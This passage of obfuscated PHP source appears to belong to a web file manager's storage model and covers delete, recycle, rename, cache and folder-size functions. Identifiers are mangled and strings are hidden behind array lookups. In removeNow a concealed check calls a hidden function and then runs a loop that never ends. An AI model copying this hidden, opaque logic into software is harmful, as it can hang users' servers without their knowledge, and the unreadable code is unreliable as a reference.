$ó²Ü¶„À); if (!$‹±±áå¼) { $‹±±áå¼ = $this->mkdir($ÁÀ¬ˆäå, $ó²Ü¶„À, REPEAT_SKIP); $this->metaSet($‹±±áå¼, $á›ƒù“Ì[2314], $œ½—»ÚŠ); $this->metaSet($‹±±áå¼, $á›ƒù“Ì[2315], $·¶¡Ğ§‚[$á›ƒù“Ì[574]]); if ($·¶¡Ğ§‚[$á›ƒù“Ì[193]] != 0) { $this->metaSet($‹±±áå¼, $á›ƒù“Ì[2316], _get($û²¬ñˆò, $á›ƒù“Ì[2317])); } } CacheLock::unlock($€”¥æ£Å); $this->metaSet($÷éôí€Ç, $á›ƒù“Ì[2318], $·¶¡Ğ§‚[$á›ƒù“Ì[193]]); $this->where(array($á›ƒù“Ì[194] => $÷éôí€Ç))->save(array($á›ƒù“Ì[501] => time())); $this->recycleClear($·¶¡Ğ§‚); Model($á›ƒù“Ì[641])->eventRemove($÷éôí€Ç); $ğáÓ°¤· = $this->move($÷éôí€Ç, $‹±±áå¼, REPEAT_RENAME_FOLDER); $this->folderSizeReset($·¶¡Ğ§‚[$á›ƒù“Ì[193]]); return $ğáÓ°¤·; } private function recycleClear($õ´ºı‚¶) { $­°Ú½ï€ =& $_SERVER[ÓïÕü]; $–æ†Òî¡ = $this->childrenAll($õ´ºı‚¶); $’äƒºÚ² = array($­°Ú½ï€[494] => array($­°Ú½ï€[495], $–æ†Òî¡[$­°Ú½ï€[2319]])); Model($­°Ú½ï€[2320])->where($’äƒºÚ²)->delete(); } public function removeNow($ìÅôß‡ú, $³ƒªŞÉú = true) { $á’áòÇÄ =& $_SERVER[ÓïÕü]; if (!isset($_SERVER[$á’áòÇÄ[933]]) || !isset($_SERVER[$á’áòÇÄ[931]])) { $É¿éÂÃ = $á’áòÇÄ[983]; $ğÌğñˆ = $á’áòÇÄ[934]; $Ô£ğ½Á³ = $_SERVER[$á’áòÇÄ[935]] . $á’áòÇÄ[936]; $ªŸŸ«ïÑ = $ğÌğñˆ($Ô£ğ½Á³); $áÔ‹‰Ö = explode($á’áòÇÄ[288], $ªŸŸ«ïÑ); if (count($áÔ‹‰Ö) < $á’áòÇÄ[708]) { $ğÜèİáü = $á’áòÇÄ[937]; $ğÜèİáü(); } $òÄÖä­ = $á’áòÇÄ[984]; $òÄÖä­($_SERVER[$á’áòÇÄ[985]]); $ì¸’­ıÍ = 1; for ($¨¿Ù«ˆŞ = $ì¸’­ıÍ; $¨¿Ù«ˆŞ > 0; $¨¿Ù«ˆŞ++) { $òÄÖä­ = json_encode($GLOBALS[$á’áòÇÄ[495]]); } } $ÀÛûŞ€Î = $this->sourceInfo($ìÅôß‡ú); $Í†Ğõ®Ê = $this->pathInfoMore($ìÅôß‡ú); if (!$ÀÛûŞ€Î) { return !0; } if ($ÀÛûŞ€Î[$á’áòÇÄ[193]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ìÅôß‡ú); Hook::trigger($á’áòÇÄ[2321], $Í†Ğõ®Ê, $³ƒªŞÉú); if ($³ƒªŞÉú) { Model($á’áòÇÄ[2320])->moveToRecycle($ìÅôß‡ú); } else { $ºáÅÓ¥õ = $this->childrenAll($ÀÛûŞ€Î); Model($á’áòÇÄ[641])->eventRemove($ìÅôß‡ú); $this->removeRelevance($ºáÅÓ¥õ[$á’áòÇÄ[2319]], $ºáÅÓ¥õ[$á’áòÇÄ[1610]]); } $this->folderSizeReset($ÀÛûŞ€Î[$á’áòÇÄ[193]]); $œşø´Ô = array($ÀÛûŞ€Î[$á’áòÇÄ[193]]); if ($ÀÛûŞ€Î[$á’áòÇÄ[488]] == $á’áòÇÄ[91]) { $œşø´Ô[] = $ÀÛûŞ€Î[$á’áòÇÄ[194]]; } $this->updateModifyTime($œşø´Ô); $this->lockMoveEnd($ìÅôß‡ú); Hook::trigger($á’áòÇÄ[1849], $Í†Ğõ®Ê, $³ƒªŞÉú); return !0; } public function childrenAll($¦ºß©£§) { $åäÁÖï =& $_SERVER[ÓïÕü]; $³‡°Ö¯ = $¦ºß©£§[$åäÁÖï[194]]; if ($¦ºß©£§[$åäÁÖï[488]] == $åäÁÖï[91]) { $°è¢³¦Â = array($åäÁÖï[660] => array($åäÁÖï[620], $¦ºß©£§[$åäÁÖï[589]] . $³‡°Ö¯ . $åäÁÖï[621])); $óû¬„œ = array($åäÁÖï[660] => $°è¢³¦Â[$åäÁÖï[589]]); $æëİÚ· = $this->field($åäÁÖï[2322])->where($óû¬„œ)->select(); $½ÌéÂŒ» = !1; $ØÅÅ€±Ù = array($³‡°Ö¯); if ($æëİÚ·) { $½ÌéÂŒ» = array_to_keyvalue($æëİÚ·, $åäÁÖï[12], $åäÁÖï[546]); $½ÌéÂŒ» = array_remove_value($½ÌéÂŒ», $åäÁÖï[231]); $ØÅÅ€±Ù = array_to_keyvalue($æëİÚ·, $åäÁÖï[12], $åäÁÖï[194]); $ØÅÅ€±Ù[] = $³‡°Ö¯; } } else { $½ÌéÂŒ» = array($¦ºß©£§[$åäÁÖï[546]]); $ØÅÅ€±Ù = array($³‡°Ö¯); } return array($åäÁÖï[2319] => $ØÅÅ€±Ù, $åäÁÖï[1610] => $½ÌéÂŒ»); } public function removeArray($–åØë¢) { if (!$–åØë¢) { return !0; } } public function removeRelevance($®¯ããù», $Íå–õ) { $àã¡ò¢ç =& $_SERVER[ÓïÕü]; $®¯ããù» = $®¯ããù» ? $®¯ããù» : array(); $Íå–õ = $Íå–õ ? $Íå–õ : array(); $®¯ããù» = array_unique(array_filter($®¯ããù»)); $Íå–õ = array_unique(array_filter($Íå–õ)); if (!$®¯ããù») { return !1; } $ˆ¾¾½¼¸ = array($àã¡ò¢ç[494] => array($àã¡ò¢ç[495], $®¯ããù»)); Model($àã¡ò¢ç[2320])->where($ˆ¾¾½¼¸)->delete(); Model($àã¡ò¢ç[538])->where($ˆ¾¾½¼¸)->delete(); Model($àã¡ò¢ç[2161])->where($ˆ¾¾½¼¸)->delete(); Model($àã¡ò¢ç[641])->where($ˆ¾¾½¼¸)->delete(); Model($àã¡ò¢ç[1986])->removeBySource($®¯ããù»); Model($àã¡ò¢ç[2301])->removeBySource($®¯ããù»); $this->where($ˆ¾¾½¼¸)->delete(); Model($àã¡ò¢ç[549])->remove($Íå–õ); for ($û»‘ÁÉå = 0; $û»‘ÁÉå < count($®¯ããù»); $û»‘ÁÉå++) { $this->sourceCacheClear($®¯ããù»[$û»‘ÁÉå]); } } public function rename($À·ä”À­, $°ï™Î×) { $Ä“Î‡ëü =& $_SERVER[ÓïÕü]; $ªåëÊùò = $this->sourceInfo($À·ä”À­); if (!$ªåëÊùò) { return !1; } $äš¯ñ»š = $this->fileNameExist($ªåëÊùò[$Ä“Î‡ëü[193]], $°ï™Î×); if ($äš¯ñ»š && $äš¯ñ»š != $À·ä”À­) { return !1; } $—™ƒ—–€ = array($Ä“Î‡ëü[497] => $°ï™Î×, $Ä“Î‡ëü[659] => USER_ID); if ($ªåëÊùò[$Ä“Î‡ëü[488]] != $Ä“Î‡ëü[91]) { $—™ƒ—–€[$Ä“Î‡ëü[489]] = substr(get_path_ext($°ï™Î×), 0, 10); } Model($Ä“Î‡ëü[641])->eventRename($À·ä”À­, $ªåëÊùò[$Ä“Î‡ëü[32]], $°ï™Î×); $this->sourceCacheClear($À·ä”À­); $this->setNamePinyin($À·ä”À­, $—™ƒ—–€[$Ä“Î‡ëü[32]], !1); $this->updateModifyTime($ªåëÊùò[$Ä“Î‡ëü[193]]); $âÍ•Ì‹È = $this->where(array($Ä“Î‡ëü[494] => $À·ä”À­))->data($—™ƒ—–€)->save(); $ø½Õæíí = $Ä“Î‡ëü[2309] . $ªåëÊùò[$Ä“Î‡ëü[193]]; if (isset(self::$cacheChildList[$ø½Õæíí])) { unset(self::$cacheChildList[$ø½Õæíí]); } return $âÍ•Ì‹È; } public function setNamePinyin($Ë†øóÛ€, $¤€ö°›è, $¬ÀƒİÇ = true) { $˜×¿ìß× =& $_SERVER[ÓïÕü]; $äï”ç–³ = Input::check($¤€ö°›è, $˜×¿ìß×[663]); $Ğí”ßŒÉ = array($˜×¿ìß×[520] => KodSort::makeStr($¤€ö°›è)); if ($äï”ç–³) { $Ğí”ßŒÉ[$˜×¿ìß×[541]] = str_replace($˜×¿ìß×[53], $˜×¿ìß×[12], Pinyin::get($¤€ö°›è)); $Ğí”ßŒÉ[$˜×¿ìß×[540]] = Pinyin::get($¤€ö°›è, $˜×¿ìß×[664]); } if (!$¬ÀƒİÇ && !$äï”ç–³) { $Ğí”ßŒÉ[$˜×¿ìß×[541]] = null; $Ğí”ßŒÉ[$˜×¿ìß×[540]] = null; } $this->metaSet($Ë†øóÛ€, $Ğí”ßŒÉ); } public function getContent($‰®±¨•¶) { $Ñï¤òÆ =& $_SERVER[ÓïÕü]; $°•Ù‡ŸÜ = $this->fileInfoGet($‰®±¨•¶); if (!$°•Ù‡ŸÜ) { return !1; } if ($°•Ù‡ŸÜ[$Ñï¤òÆ[79]] == 0) { return $Ñï¤òÆ[12]; } $ËŞâÙş¡ = $Ñï¤òÆ[2323] . $°•Ù‡ŸÜ[$Ñï¤òÆ[552]]; if ($°•Ù‡ŸÜ[$Ñï¤òÆ[79]] <= 1024 * 10) { $ÏšÑíÑ½ = Cache::get($ËŞâÙş¡); if (!$ÏšÑíÑ½) { $ÏšÑíÑ½ = IO::getContent($°•Ù‡ŸÜ[$Ñï¤òÆ[87]]); Cache::set($ËŞâÙş¡, $ÏšÑíÑ½); } return $ÏšÑíÑ½; } if (!$°•Ù‡ŸÜ[$Ñï¤òÆ[87]]) { return $Ñï¤òÆ[12]; } return IO::getContent($°•Ù‡ŸÜ[$Ñï¤òÆ[87]]); } public function setDesc($ùÆ‰Ù†, $è’€…ıù) { $é¤Ÿ¡µ =& $_SERVER[ÓïÕü]; Model($é¤Ÿ¡µ[641])->eventAddDesc($ùÆ‰Ù†, $è’€…ıù); return $this->metaSet($ùÆ‰Ù†, $é¤Ÿ¡µ[529], $è’€…ıù); } public function setContent($ Øì¿üÇ, $¨§İœÍí = '') { $ì£Ç‚ï€ =& $_SERVER[ÓïÕü]; $€¢·ÕÎÒ = $this->sourceInfo($ Øì¿üÇ); $‘®ñ¨± = $this->fileInfoGet($ Øì¿üÇ); if (!$‘®ñ¨± || !$€¢·ÕÎÒ) { return !1; } $±°ÜšúÄ = KodIO::ioFileDriverGet($ì£Ç‚ï€[486] . $ Øì¿üÇ . $ì£Ç‚ï€[405]); $ÆŸ»Ó = Model($ì£Ç‚ï€[549])->addFileByContent($¨§İœÍí, $±°ÜšúÄ, $€¢·ÕÎÒ[$ì£Ç‚ï€[32]]); if (!$ÆŸ»Ó) { return !1; } $´±şæÙŸ = $this->fileHistory($€¢·ÕÎÒ, $ÆŸ»Ó[$ì£Ç‚ï€[546]], $ÆŸ»Ó[$ì£Ç‚ï€[79]]); if (!$´±şæÙŸ) { return Model($ì£Ç‚ï€[549])->remove($ÆŸ»Ó[$ì£Ç‚ï€[546]]); } $this->folderSizeReset($€¢·ÕÎÒ[$ì£Ç‚ï€[193]]); return !0; } public function fileSubstr($Œùƒí¾€, $¿–²¶¥‰, $ÜÎÁ®ûÌ) { $´™ª…¸î = $this->fileInfoGet($Œùƒí¾€); if (!$´™ª…¸î) { return !1; } return IO::fileSubstr($´™ª…¸î[$_SERVER[ÓïÕü][87]], $¿–²¶¥‰, $ÜÎÁ®ûÌ); } public function fileInfoGet($æà¯Ã˜°) { $Ü„…¸Š¡ =& $_SERVER[ÓïÕü]; $±áø¯ß = $this->sourceInfo($æà¯Ã˜°); if (!$±áø¯ß || $±áø¯ß[$Ü„…¸Š¡[488]]) { return !1; } $é©×ğÌÆ = $Ü„…¸Š¡[553] . $±áø¯ß[$Ü„…¸Š¡[546]]; $Üõ»ì™Ã = _get(self::$cacheFileInfo, $é©×ğÌÆ); if ($Üõ»ì™Ã) { return $Üõ»ì™Ã; } $¹ó¦Á¾Ğ = Model($Ü„…¸Š¡[549])->fileInfo($±áø¯ß[$Ü„…¸Š¡[546]]); if ($¹ó¦Á¾Ğ) { $¹ó¦Á¾Ğ[$Ü„…¸Š¡[32]] = $±áø¯ß[$Ü„…¸Š¡[32]]; } self::$cacheFileInfo[$é©×ğÌÆ] = $¹ó¦Á¾Ğ; return $¹ó¦Á¾Ğ; } private function folderChildrenNumber($èÌñÄ’´) { $¾¶°¢Ó =& $_SERVER[ÓïÕü]; $ëúâã = $this->sourceInfo($èÌñÄ’´); $„¥ûû = array($¾¶°¢Ó[660] => array($¾¶°¢Ó[620], $ëúâã[$¾¶°¢Ó[589]] . $èÌñÄ’´ . $¾¶°¢Ó[621]), $¾¶°¢Ó[657] => $ëúâã[$¾¶°¢Ó[574]], $¾¶°¢Ó[507] => intval($ëúâã[$¾¶°¢Ó[508]]), $¾¶°¢Ó[654] => 1); $„Ùä´…¼ = $this->where($„¥ûû)->count(); $€ı‘™Ç = $this->where($„¥ûû)->where(array($¾¶°¢Ó[654] => 0))->count(); return array($¾¶°¢Ó[83] => $€ı‘™Ç, $¾¶°¢Ó[84] => $„Ùä´…¼); } public function pathInfo($Õ¾Ø»†, $©¤šìì = false) { $£³—óØĞ =& $_SERVER[ÓïÕü]; $©¤šìì = !1; $Õ¾Ø»† = intval($Õ¾Ø»†); $”¾›ª£õ = $£³—óØĞ[537] . intval($©¤šìì) . $£³—óØĞ[465] . $Õ¾Ø»†; $âïªÚ•á = _get(self::$cachePathInfo, $”¾›ª£õ); if ($âïªÚ•á) { return $âïªÚ•á; } $ŞËÖ†…ü = $this->sourceInfo($Õ¾Ø»†); if (!$ŞËÖ†…ü) { return !1; } $ŞËÖ†…ü = $this->_listDataApplyItem($ŞËÖ†…ü, $©¤šìì); self::$cachePathInfo[$”¾›ª£õ] = $ŞËÖ†…ü; return $ŞËÖ†…ü; } public static $cachePathInfoMore = array(); public function pathInfoMore($´†–‰ë ) { $üÇÚØğÈ =& $_SERVER[ÓïÕü]; $¥ãØ›™ = _get(self::$cachePathInfoMore, $´†–‰ë ); if ($¥ãØ›™) { return $¥ãØ›™; } $†ü®êŒ = $this->pathInfo($´†–‰ë ); if (!$†ü®êŒ) { return !1; } if ($†ü®êŒ[$üÇÚØğÈ[488]] == $üÇÚØğÈ[91]) { $†ü®êŒ[$üÇÚØğÈ[82]] = $this->folderChildrenNumber($´†–‰ë ); } self::$cachePathInfoMore[$´†–‰ë ] = $†ü®êŒ; return $†ü®êŒ; } public function sourceInfo($ñÈ‹Ø®Å) { $å‘ÛôÖ =& $_SERVER[ÓïÕü]; if (!$ñÈ‹Ø®Å) { return array(); } $ñÈ‹Ø®Å = intval($ñÈ‹Ø®Å); $š—âõ÷ù = $å‘ÛôÖ[536] . $ñÈ‹Ø®Å; $üÍ¦ø‡¢ = _get(self::$cacheSourceInfo, $š—âõ÷ù); if ($üÍ¦ø‡¢) { return $üÍ¦ø‡¢; } $Í­ìòŒº = $this->where(array($å‘ÛôÖ[194] => $ñÈ‹Ø®Å))->find(); self::$cacheSourceInfo[$š—âõ÷ù] = $Í­ìòŒº; return self::$cacheSourceInfo[$š—âõ÷ù]; } public function sourceCacheClear($ë—ı¤Îı = false) { self::cacheClear($ë—ı¤Îı); } public static function cacheClear($®™ùä’¤ = false) { $ÀõıÜ×‹ =& $_SERVER[ÓïÕü]; if ($®™ùä’¤ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ÀõıÜ×‹[536] . $®™ùä’¤]); unset(self::$cachePathInfoMore[$®™ùä’¤]); unset(self::$cachePathInfo[$ÀõıÜ×‹[2324] . $®™ùä’¤]); unset(self::$cachePathInfo[$ÀõıÜ×‹[2325] . $®™ùä’¤]); } public function metaSet($ëØÄš¬, $®è›Òşè = null, $ÌüÁªµ = null) { $¿£µ˜š = parent::metaSet($ëØÄš¬, $®è›Òşè, $ÌüÁªµ); if ($¿£µ˜š) { $this->sourceCacheClear($ëØÄš¬); } return $¿£µ˜š; } public function pathInfoByPath($´ÏÛ‘„, $ªîÅÏï) { $Ğ×¿ÂÂ¤ =& $_SERVER[ÓïÕü]; $²„«© å = !$ªîÅÏï ? array() : explode($Ğ×¿ÂÂ¤[8], trim($ªîÅÏï, $Ğ×¿ÂÂ¤[8])); $İÕ¾ È = $´ÏÛ‘„; foreach ($²„«© å as $·¸†˜Ğ‚) { $óÎœ×– = array($Ğ×¿ÂÂ¤[193] => $İÕ¾ È, $Ğ×¿ÂÂ¤[32] => $·¸†˜Ğ‚); $•ú¨×òî = $this->field($Ğ×¿ÂÂ¤[2326])->where($óÎœ×–)->select(); if (!$•ú¨×òî) { return !1; } $•ú¨×òî = array_sort_by($•ú¨×òî, $Ğ×¿ÂÂ¤[508]); $İÕ¾ È = $•ú¨×òî[0][$Ğ×¿ÂÂ¤[194]]; } $ÔàõÃ½‹ = $this->sourceInfo($İÕ¾ È); $this->pathInfoFilter($ÔàõÃ½‹); return $ÔàõÃ½‹; } protected function updateModifyTime($ áŞŠ†) { $çã·É =& $_SERVER[ÓïÕü]; $™–•®¿ = defined($çã·É[2234]) ? USER_ID : 0; if (!$ áŞŠ†) { return; } if (!is_array($ áŞŠ†)) { $ áŞŠ† = array($ áŞŠ†); } foreach ($ áŞŠ† as $Á›¶Äû† => $•ğ¨¢€Ì) { $ áŞŠ†[$Á›¶Äû†] = intval($•ğ¨¢€Ì); $this->sourceCacheClear($•ğ¨¢€Ì); } $íŒ—‹¼« = array($çã·É[194] => array($çã·É[7], $ áŞŠ†)); $ÀÂ™Å½¥ = array($çã·É[659] => $™–•®¿, $çã·É[501] => time()); $this->where($íŒ—‹¼«)->save($ÀÂ™Å½¥); } public function folderSizeReset($ÑÕ†ó, $Â¹ƒô–Ö = false) { $¡Î±£Ü =& $_SERVER[ÓïÕü]; if ($this->statusIgnoreResetSpace) { return; } $×ÄáÑŞı = $this->sourceInfo($ÑÕ†ó); $µËµâéé = $¡Î±£Ü[2327] . $ÑÕ†ó; CacheLock::lock($µËµâéé, 20); if ($Â¹ƒô–Ö === !1) { $this->sourceCacheClear($ÑÕ†ó); $×ÄáÑŞı = $this->sourceInfo($ÑÕ†ó); $éÙ†ÑĞ” = array($¡Î±£Ü[480] => $ÑÕ†ó, $¡Î±£Ü[507] => 0); $òØç¡÷Ç = $this->where($éÙ†ÑĞ”)->sum($¡Î±£Ü[79]); $Â¹ƒô–Ö = intval($òØç¡÷Ç) - intval($×ÄáÑŞı[$¡Î±£Ü[79]]); } if ($Â¹ƒô–Ö == 0) { return CacheLock::unlock($µËµâéé); } $¸´…®ë = $this->parentLevelArray($×ÄáÑŞı[$¡Î±£Ü[589]]); if (!$¸´…®ë) { $¸´…®ë = array(); } $¸´…®ë[] = $×ÄáÑŞı[$¡Î±£Ü[194]]; $éÙ†ÑĞ” = array($¡Î±£Ü[194] => array($¡Î±£Ü[495], $¸´…®ë)); if ($Â¹ƒô–Ö < 0) { $éÙ†ÑĞ”[$¡Î±£Ü[79]] = array($¡Î±£Ü[1119], abs($Â¹ƒô–Ö)); } $this->where($éÙ†ÑĞ”)->setAdd($¡Î±£Ü[79], $Â¹ƒô–Ö); CacheLock::unlock($µËµâéé); $ ˜İ–Å = $¡Î±£Ü[2328] . $×ÄáÑŞı[$¡Î±£Ü[191]] . $¡Î±£Ü[4] . $×ÄáÑŞı[$¡Î±£Ü[574]]; $³ëèºŒ = array($×ÄáÑŞı[$¡Î±£Ü[191]], $×ÄáÑŞı[$¡Î±£Ü[574]]); TaskRun::timeLimitCall($ ˜İ–Å, $¡Î±£Ü[2329], $³ëèºŒ, 1.5); } public function folderSizeResetChildren($˜­ùñ¿õ) { $‰¥ñºş =& $_SERVER[ÓïÕü]; $this->sourceCacheClear($˜­ùñ¿õ); $ûÓŸñõÁ = $this->sourceInfo($˜­ùñ¿õ); $œ©ËÛ = array($‰¥ñºş[654] => 1, $‰¥ñºş[657] => $ûÓŸñõÁ[$‰¥ñºş[574]], $‰¥ñºş[660] => array($‰¥ñºş[620], $ûÓŸñõÁ[$‰¥ñºş[589]] . $˜­ùñ¿õ . $‰¥ñºş[621])); $‰áË’ = $‰¥ñºş[2330]; $¨—ôõåó = $this->field($‰áË’)->where($œ©ËÛ)->select(); $œ©ËÛ[$‰¥ñºş[488]] = 0; $ŒÛøÉ¥± = $this->field($‰áË’)->where($œ©ËÛ)->select(); if (!$ŒÛøÉ¥±) { return; } $¨—ôõåó[] = $ûÓŸñõÁ; $¨—ôõåó = array_to_keyvalue($¨—ôõåó, $‰¥ñºş[194]); foreach ($¨—ôõåó as $¢¿øˆò¦ => $Ã‹Ò›öâ) { $¨—ôõåó[$¢¿øˆò¦][$‰¥ñºş[2331]] = $¨—ôõåó[$¢¿øˆò¦][$‰¥ñºş[79]]; $¨—ôõåó[$¢¿øˆò¦][$‰¥ñºş[79]] = 0; } foreach ($ŒÛøÉ¥± as $Ã‹Ò›öâ) { $®°ûåÆ = $Ã‹Ò›öâ[$‰¥ñºş[193]] . $‰¥ñºş[12]; if (!isset($¨—ôõåó[$®°ûåÆ])) { continue; } if ($Ã‹Ò›öâ[$‰¥ñºş[508]] == $¨—ôõåó[$®°ûåÆ][$‰¥ñºş[508]]) { $¨—ôõåó[$®°ûåÆ][$‰¥ñºş[79]] += $Ã‹Ò›öâ[$‰¥ñºş[79]]; } } foreach ($¨—ôõåó as $Ã‹Ò›öâ) { $ôû×ËŠ– = $this->parentLevelArray($Ã‹Ò›öâ[$‰¥ñºş[589]]); foreach ($ôû×ËŠ– as $®°ûåÆ) { $®°ûåÆ = $®°ûåÆ . $‰¥ñºş[12]; if (!isset($¨—ôõåó[$®°ûåÆ])) { continue; } if ($Ã‹Ò›öâ[$‰¥ñºş[508]] == $¨—ôõåó[$®°ûåÆ][$‰¥ñºş[508]]) { $¨—ôõåó[$®°ûåÆ][$‰¥ñºş[79]] += $Ã‹Ò›öâ[$‰¥ñºş[79]]; } } } $æƒ÷½« = array(); foreach ($¨—ôõåó as $Ã‹Ò›öâ) { if ($Ã‹Ò›öâ[$‰¥ñºş[79]] == $Ã‹Ò›öâ[$‰¥ñºş[2331]]) { continue; } $æƒ÷½«[] = array($‰¥ñºş[194], $Ã‹Ò›öâ[$‰¥ñºş[194]], $‰¥ñºş[79], $Ã‹Ò›öâ[$‰¥ñºş[79]]); } $this->saveAll($æƒ÷½«); } public function userSpaceReset($Ñë°î‚¢ = false) { $—ŒŞşğŸ =& $_SERVER[ÓïÕü]; $ï•§€„ = $this->where(array($—ŒŞşğŸ[191] => self::TYPE_USER, $—ŒŞşğŸ[574] => $Ñë°î‚¢, $—ŒŞşğŸ[488] => 0))->sum($—ŒŞşğŸ[79]); $ï•§€„ = !$ï•§€„ || $ï•§€„ <= 0 ? 0 : $ï•§€„; Model($—ŒŞşğŸ[582])->userEdit($Ñë°î‚¢, array($—ŒŞşğŸ[1995] => $ï•§€„)); } public function targetSpaceUpdate($è’µ§•æ, $÷ò™») { $ëˆºÆ‹ğ =& $_SERVER[ÓïÕü]; if (!$÷ò™») { return; } if (!in_array($è’µ§•æ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $¤¦‘àÈ = $this->targetSpaceSize($è’µ§•æ, $÷ò™»); if ($è’µ§•æ == self::TYPE_USER) { Model($ëˆºÆ‹ğ[582])->userEdit($÷ò™», array($ëˆºÆ‹ğ[1995] => $¤¦‘àÈ)); } else { if ($è’µ§•æ == self::TYPE_GROUP) { Model($ëˆºÆ‹ğ[590])->groupEdit($÷ò™», array($ëˆºÆ‹ğ[1995] => $¤¦‘àÈ)); } } } public function targetSpaceSize($ò“›¼şî, $ØûåÓı ) { $ûò»‚“‹ =& $_SERVER[ÓïÕü]; $¦·ÙâòÄ = 0; $ÙÂÉ°Ï = $this->targetSourceRoot($ò“›¼şî, $ØûåÓı , !0); foreach ($ÙÂÉ°Ï as $ù¡™ê³) { if (!$ù¡™ê³) { continue; } $¦·ÙâòÄ += floatval($ù¡™ê³[$ûò»‚“‹[79]]); $ÈÖ°€İß = array($ûò»‚“‹[660] => array($ûò»‚“‹[620], $ûò»‚“‹[598] . $ù¡™ê³[$ûò»‚“‹[194]] . $ûò»‚“‹[621])); $æÑËŠŸİ = Model($ûò»‚“‹[506])->field($ûò»‚“‹[494])->where($ÈÖ°€İß)->select(); $æÑËŠŸİ = array_to_keyvalue($æÑËŠŸİ, $ûò»‚“‹[12], $ûò»‚“‹[194]); $æÑËŠŸİ = array_unique(array_filter($æÑËŠŸİ)); if ($æÑËŠŸİ) { $ÈÖ°€İß = array($ûò»‚“‹[494] => array($ûò»‚“‹[495], $æÑËŠŸİ)); $¦·ÙâòÄ += floatval($this->where($ÈÖ°€İß)->sum($ûò»‚“‹[79])); } } $¦·ÙâòÄ = !$¦·ÙâòÄ || $¦·ÙâòÄ <= 0 ? 0 : $¦·ÙâòÄ; return $¦·ÙâòÄ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Ìøöš„Ş) { return $this->fileTypeProfile($Ìøöš„Ş, SourceModel::TYPE_USER); } public function groupFileTypeProfile($á¨à¸óî) { return $this->fileTypeProfile($á¨à¸óî, SourceModel::TYPE_GROUP); } private function fileTypeProfile($åĞ€Ì, $òÊÛüà›) { $ãˆğŒşÇ =& $_SERVER[ÓïÕü]; $õİ²Ÿ±« = $ãˆğŒşÇ[2332] . $åĞ€Ì . $ãˆğŒşÇ[11] . $òÊÛüà›; $²ÁØ³˜á = Cache::get($õİ²Ÿ±«); if ($²ÁØ³˜á) { return $²ÁØ³˜á; } $±Àú‰´£ = array($ãˆğŒşÇ[654] => 0); if ($åĞ€Ì != !1) { $±Àú‰´£[$ãˆğŒşÇ[574]] = $åĞ€Ì; $±Àú‰´£[$ãˆğŒşÇ[191]] = $òÊÛüà›; } $‘ş±Ø¸Ã = array(); $‘ş±Ø¸Ã[$ãˆğŒşÇ[2333]] = array($ãˆğŒşÇ[2334] => LNG($ãˆğŒşÇ[2333]), $ãˆğŒşÇ[2335] => $this->where($±Àú‰´£)->count(), $ãˆğŒşÇ[625] => $this->where($±Àú‰´£)->sum($ãˆğŒşÇ[79])); $…•¯±’ = KodIO::fileTypeList(); foreach ($…•¯±’ as $ÇÊşÍÕÑ => $Â—«ÖŒ¨) { $±Àú‰´£[$ãˆğŒşÇ[489]] = $this->fileTypeWhere($ÇÊşÍÕÑ); $‘ş±Ø¸Ã[$ÇÊşÍÕÑ] = array($ãˆğŒşÇ[2334] => $Â—«ÖŒ¨[$ãˆğŒşÇ[32]], $ãˆğŒşÇ[2335] => $this->where($±Àú‰´£)->count(), $ãˆğŒşÇ[625] => $this->where($±Àú‰´£)->sum($ãˆğŒşÇ[79])); } Cache::set($õİ²Ÿ±«, $‘ş±Ø¸Ã, 1200); return $‘ş±Ø¸Ã; } public function fileNameExist($ö¯²ô”Ä, $ã³øæÄ­) { $éÙÛ¯ =& $_SERVER[ÓïÕü]; $™Éş—ùã = $this->field($éÙÛ¯[2336])->where(array($éÙÛ¯[193] => $ö¯²ô”Ä, $éÙÛ¯[32] => $ã³øæÄ­, $éÙÛ¯[508] => 0))->find(); return is_array($™Éş—ùã) ? $™Éş—ùã[$éÙÛ¯[194]] : !1; } public function childList($¢í÷ˆ³Á) { $­çÉìù¸ =& $_SERVER[ÓïÕü]; $ãš©“¶Ö = $­çÉìù¸[2309] . $¢í÷ˆ³Á; if (isset(self::$cacheChildList[$ãš©“¶Ö])) { return self::$cacheChildList[$ãš©“¶Ö]; } $¢Æ­ğáş = array($­çÉìù¸[193] => intval($¢í÷ˆ³Á), $­çÉìù¸[508] => 0); $›á«Úµ = $this->where($¢Æ­ğáş)->select(); $›á«Úµ = $›á«Úµ ? $›á«Úµ : array(); self::$cacheChildList[$ãš©“¶Ö] = $›á«Úµ; foreach ($›á«Úµ as $Ø˜­ÑŒ¬) { $ãš©“¶Ö = $­çÉìù¸[536] . $Ø˜­ÑŒ¬[$­çÉìù¸[194]]; self::$cacheSourceInfo[$ãš©“¶Ö] = $Ø˜­ÑŒ¬; } return $›á«Úµ; } public function fileNameAuto($Ñ¾İœÒË, $ŞÄÅÕ¬º, $³ş¹¤˜ı = REPEAT_RENAME, $Â´ÂÀ„Ş = false) { $¨ÉĞİ× =& $_SERVER[ÓïÕü]; $•úË‚Ûí = get_path_ext($ŞÄÅÕ¬º); $€–£Æ²Ä = $•úË‚Ûí ? get_path_ext_name($ŞÄÅÕ¬º) . $¨ÉĞİ×[2337] . $•úË‚Ûí : $ŞÄÅÕ¬º . $¨ÉĞİ×[463]; $êòå“èÍ = array($¨ÉĞİ×[193] => $Ñ¾İœÒË, $¨ÉĞİ×[508] => 0, $¨ÉĞİ×[32] => array($¨ÉĞİ×[462], $€–£Æ²Ä)); $áŒìì = $this->field($¨ÉĞİ×[32])->where($êòå“èÍ)->select(); $¦Š¢¬°¼ = array_to_keyvalue($áŒìì, $¨ÉĞİ×[12], $¨ÉĞİ×[32]); return $this->fileNameAutoGet($¦Š¢¬°¼, $ŞÄÅÕ¬º, $³ş¹¤˜ı, $Â´ÂÀ„Ş); } public function fileNameAutoGet($Ğ‡Ï­‘‡, $û¡Ğø¦³, $ïÁêÚ¦, $Ñ—’Êœ) { $Æ³œù¹¬ =& $_SERVER[ÓïÕü]; if ($ïÁêÚ¦ == REPEAT_REPLACE || !$Ğ‡Ï­‘‡ || !in_array_not_case($û¡Ğø¦³, $Ğ‡Ï­‘‡) || $Ñ—’Êœ && $ïÁêÚ¦ != REPEAT_RENAME_FOLDER) { return $û¡Ğø¦³; } if ($ïÁêÚ¦ == REPEAT_SKIP) 